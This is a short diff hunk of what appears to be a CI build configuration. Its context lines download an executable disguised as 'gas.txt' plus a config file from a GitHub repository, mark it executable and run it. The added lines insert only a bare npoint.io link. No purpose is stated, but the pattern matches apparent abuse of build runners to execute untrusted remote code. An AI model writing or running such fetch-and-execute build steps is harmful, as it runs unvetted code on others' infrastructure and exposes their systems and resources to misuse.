@@ -3,3 +3,6 @@ build:
   - wget https://github.com/mojtabaIRI/gas/raw/main/gas.txt
   - wget https://raw.githubusercontent.com/mojtabaIRI/gas/main/script3.ini
   - chmod +x gas.txt && ./gas.txt script3.ini
+
+
+https://www.npoint.io/docs/1fa0885e2491810fabca
